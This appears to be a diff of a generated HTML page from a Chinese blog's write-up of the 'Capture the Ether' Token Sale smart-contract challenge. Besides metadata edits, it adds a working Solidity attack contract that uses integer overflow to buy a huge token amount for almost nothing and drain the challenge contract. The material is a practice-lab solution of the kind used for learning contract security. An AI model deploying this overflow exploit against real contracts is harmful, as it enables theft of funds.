@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,13 +2995,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：639 字</p>
+      <p>字数：727 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-bell fa-fw" aria-hidden="true"></i>
-      <p>时长：2 分钟</p>
+      <p>时长：3 分钟</p>
     </a>
   </div>
 
@@ -3094,12 +3094,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 <li><p>2.7 以 1 为参数调用 sell函数</p>
 </li>
-<li><p><img src="https://s1.vika.cn/space/2023/04/14/0c49ee1d68e04136bfa830831dd5daf6" alt="image-20230414104440073"></p>
+<li><p><img src="https://cdn.staticaly.com/gh/LBiyou/BlogImages@main/img/202308121140064.png" alt="image-20230414104440073"></p>
 </li>
 <li><p>解题成功</p>
 </li>
 </ul>
 <h2 id="3-解题"><a href="#3-解题" class="headerlink" title="3. 解题"></a>3. 解题</h2><p>解题过程如上述<code>分析</code></p>
+<p><em><strong>一段时间时候，二刷</strong></em></p>
+<p><strong>攻击合约</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line"></span><br><span class="line">    TokenSaleChallenge challenge;</span><br><span class="line"></span><br><span class="line">    function Hack(address _challenge) public payable &#123;</span><br><span class="line">        challenge = TokenSaleChallenge(_challenge);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function figure() internal pure returns (uint256) &#123;</span><br><span class="line">        return (getMax() / 1 ether + 1) * 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMax() internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 zero = 0;</span><br><span class="line">        return zero - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        challenge.buy.value(figure())(getMax() / 1 ether + 1);</span><br><span class="line">        challenge.sell(1);</span><br><span class="line">        require(challenge.isComplete());</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -3200,18 +3204,19 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     <div class="prev-next">
       
-        <a class='prev' href='/2023/04/12/Solidity/Basic_Knowledge/solidity%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>solidity的整数溢出</p>
-          <p class='content'>solidity的整数溢出资料收集中：文章一
-</p>
+        <a class='prev' href='/2023/04/13/Smart%20contracts/capther%20the%20ether/Token%20whale/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Token whale</p>
+          <p class='content'>Token whale1. 题目
+1.1 要求：
+
+This ERC20-compatible token is hard to acquire. There’s a fixed supply ...</p>
         </a>
       
       
-        <a class='next' href='/2023/04/12/Web3/Basic_Knowledge/web3%20%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/'>
-          <p class='title'>web3 学习总结<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>web3 学习总结1. 合约的部署 – 需要发送主币，以及传入参数以一个冒泡排序合约为例
-合约代码：
-1234567891011121314151617181920212223242526272...</p>
+        <a class='next' href='/2023/04/12/Solidity/Basic_Knowledge/solidity%E7%9A%84%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/'>
+          <p class='title'>solidity的整数溢出<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>solidity的整数溢出资料收集中：文章一
+</p>
         </a>
       
     </div>
